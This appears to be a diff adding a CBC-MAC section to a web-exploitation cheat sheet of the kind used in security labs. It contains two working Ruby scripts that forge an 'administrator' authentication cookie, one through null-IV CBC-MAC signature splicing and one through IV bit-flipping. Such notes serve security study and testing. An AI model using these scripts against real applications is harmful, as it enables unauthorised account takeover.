@@ -395,6 +395,67 @@ We can run code execution here if the server using `ruby` with `Kernel.open/open
 ## Leaked .git
 We can [this](https://github.com/internetwache/GitTools) tools to extract leaked `.git/` directory
 
+## CBC-MAC
+In this example, we will change our user to `administrator`. We know that CBC has 8 bytes So we need to create 2 `user`. It's `administ` and `rator`. We need to generate the first signature using `administ`, because the IV is null. After that, we XOR the signature from `administ` and `rator` so we get signature2. After that, we generate `administrator` with signature2.
+
+Here is the code:
+
+```ruby
+require 'httparty'
+require 'base64'
+
+URL = "URL"
+def login(username, password)
+    res = HTTParty.post(URL+'login.php', body: { username: username, password: password}, follow_redirects: false)
+
+    # auth = Val
+    return res.headers['set-cookie'].split("=")[1]
+end
+
+cookie =  login("administ", "aaa")
+signature1 = Base64.decode64(cookie).split("--")[1]
+
+def xor(str1, str2)
+    ret = ""
+    str1.split(//).each_with_index do |c, i|
+        ret[i] = (str1[i].ord ^ str2[i].ord).chr
+    end
+    return ret
+end
+
+username2 = xor("rator\00\00\00", signature1)
+cookie2 = login(username2, "aaa").gsub("%2B", "+")
+signature2 = Base64.decode64(cookie2).split("--")[1]
+
+puts Base64.encode64("administrator--#{signature2}")
+```
+
+If we can modify the IV value, we are able to change the first block of the cleartext without impacting the signature. The only thing we need to keep in mind is that a **XOR is used between the IV and the first block**. Any modification of the cleartext will need to be XOR'ed with the IV. So if we change the value of the first byte of the first block from a to b, we will need to change the first byte of the IV by XORing with a^b.
+
+Here is the example code:
+
+```ruby
+require 'uri'
+require 'base64'
+
+iv = "QA2vUfmm%2FNE%3D"
+auth = "Y2RtaW5pc3RyYXRvci0tEnzv4HnJXPA%3D"
+
+decoded_iv = Base64.decode64(URI.unescape(iv))
+decoded_auth = Base64.decode64(URI.unescape(auth))
+
+# Craft the payload
+decoded_iv[0] = ('a'.ord^'c'.ord^decoded_iv[0].ord).chr
+decoded_auth[0] = 'a'
+
+new_iv = URI.escape(Base64.strict_encode64(decoded_iv), "+=/")
+new_auth = URI.escape(Base64.strict_encode64(decoded_auth), "+=/")
+
+puts("iv = " + new_iv)
+puts("auth = " + new_auth)
+```
+
+
 
 
 ## Other
